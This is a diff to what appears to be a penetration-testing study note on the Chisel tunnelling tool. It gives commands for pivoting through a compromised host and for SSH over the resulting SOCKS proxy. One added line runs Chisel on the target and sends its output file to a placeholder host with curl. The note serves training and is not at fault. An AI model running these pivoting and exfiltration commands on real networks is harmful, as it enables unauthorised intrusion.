@@ -2,7 +2,7 @@
 
 Fast TCP/UDP tunnel over HTTP, secured via SSH under the hood. A single binary that runs as either a server (on Kali) or a client (dropped on a compromised target), used for pivoting into a network segment that isn't otherwise reachable.
 
-> **No current module cross-link yet.** None of the 7 modules covered so far (Information Gathering through Client-Side Attacks) teach pivoting/tunneling, that's later curriculum. Included here anyway since this is the exact tool named as the motivating example for this whole tooling sweep, will get wired into a real module section once pivoting content is actually covered.
+Cross-links: [[Pivoting, Tunneling, and Port Forwarding (HTB Supplementary)#PT.5 Chisel (Forward Variant)|PT.5 Chisel]], [[Port Redirection and SSH Tunneling (Command Appendix)#Chisel SOCKS5 Forward Variant (HTTP-Tunneled Pivoting)|Command Appendix]]
 
 ---
 
@@ -34,6 +34,71 @@ proxychains nmap -sT -Pn <internal_target>
 ```
 *`--reverse` on the server side lets the target-side client initiate the connection outbound (works even when Kali can't reach the target directly, only the target can reach Kali), the more common real-world direction once you're behind a firewall. `R:socks` sets up a reverse dynamic SOCKS proxy specifically, other forwarding modes exist for single-port forwards instead of a full SOCKS proxy.*
 
-See also [[Ligolo-ng]] for a TUN-interface-based alternative that skips `proxychains` entirely once pivoting content is actually covered.
+---
 
-#### Tags: #ModernTooling #Chisel #Pivoting #Tunneling #ProxyChains
+## Forward Variant (pivot host as server)
+
+The reverse variant (above) has Kali as the server. There's also a forward variant where the **pivot host runs the server** and Kali is the client connecting into it. Use this when Kali can reach the pivot host inbound but you want to avoid SSH entirely.
+
+```bash
+# On the pivot host (compromised Linux box acting as the jump point):
+./chisel server -v -p 1234 --socks5
+
+# On Kali (connecting to the pivot to open the SOCKS proxy):
+chisel client -v <PIVOT_IP>:1234 socks
+```
+
+→ This opens SOCKS5 proxy on Kali's `127.0.0.1:1080`.
+→ Update `/etc/proxychains4.conf`: `socks5 127.0.0.1 1080`
+→ Then `proxychains nmap -sT -Pn -n <target>` as normal.
+
+**Comparison:**
+
+| | Reverse (Kali = server) | Forward (pivot = server) |
+|---|---|---|
+| Kali can reach pivot inbound? | Not needed | Yes, required |
+| Pivot initiates outbound connection? | Yes | No |
+| SOCKS type | SOCKS5 | SOCKS5 |
+| proxychains port | 1080 | 1080 |
+| Common when | Pivot behind firewall, can only call home | Pivot is openly accessible, no SSH needed |
+
+See also [[Ligolo-ng]] for a TUN-interface-based alternative that skips `proxychains` entirely.
+
+---
+
+## SSH Through a Chisel SOCKS Proxy (ProxyCommand + Ncat)
+
+`proxychains ssh` works but the cleanest approach is `ProxyCommand`. Kali's built-in `nc` doesn't support SOCKS; use **ncat** instead:
+
+```bash
+sudo apt install ncat
+
+ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' user@<internal-host>
+# %h = SSH destination host  %p = SSH destination port (filled in by SSH at runtime)
+```
+
+---
+
+## glibc Incompatibility (Go 1.20+ vs Older Targets)
+
+Kali packages Chisel compiled with Go 1.20+. Targets running older Ubuntu/Debian may not have glibc 2.32 or 2.34, causing:
+```
+/tmp/chisel: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.32' not found
+```
+
+**Fix:** Download the official v1.8.1 release binary (compiled with Go 1.19):
+```bash
+wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz
+gunzip chisel_1.8.1_linux_amd64.gz && chmod +x chisel_1.8.1
+```
+
+Use the blind error-collection pattern to detect this without direct shell access:
+```bash
+/tmp/chisel client <ip>:<port> R:socks &> /tmp/output; curl --data @/tmp/output http://<ip>:<port>/
+```
+
+**General rule:** Any Go binary compiled with 1.20+ fails on glibc < 2.32. Always check the target's glibc version (`ldd --version`) if you control it, or use the older compiled release.
+
+Cross-link: [[Tunneling Through Deep Packet Inspection#20.1.2 HTTP Tunneling with Chisel]]
+
+#### Tags: #ModernTooling #Chisel #Pivoting #Tunneling #ProxyChains #ProxyCommand #Ncat #DPI #HTTPTunnel #Module20 #HTBSupplementary
